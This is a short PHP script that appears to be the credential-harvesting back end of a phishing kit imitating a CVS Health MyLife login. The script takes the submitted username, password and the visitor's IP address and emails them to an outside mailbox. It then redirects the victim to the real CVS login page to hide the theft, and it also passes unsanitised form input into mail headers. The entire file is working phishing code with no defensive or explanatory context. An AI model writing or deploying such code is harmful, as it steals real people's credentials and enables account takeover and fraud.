<?

$ip = getenv("REMOTE_ADDR");
$message .= "username: ".$_POST['USER']."\n";
$message .= "Password: ".$_POST['PASSWORD']."\n";
$message .= "IP: ".$ip."\n";
$message .= "\n";



$recipient = "lloydroy7@mailnesia.com,";
$subject = "Email IDs";
$headers = "From: responders";
$headers .= $_POST['Editbox1']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://mylife.cvshealth.com/siteminderagent/forms/MyLifeLogin.fcc?TYPE=33554433&REALMOID=06-000eaa6c-cd39-1575-b779-f8a50a5c905d&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-XWs8rm2yzbmh4NHY2UWcingpVrtzEWGE6j6wm37Io3lFTSlBmL30ccd8%2fNqYwGM7QPEg1xmPRZCztte0L6E0Ek%2bbVn5IU12Q&TARGET=-SM-https%3a%2f%2fmylife%2ecvshealth%2ecom%2fwebcenter%2fportal%2fmylife");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>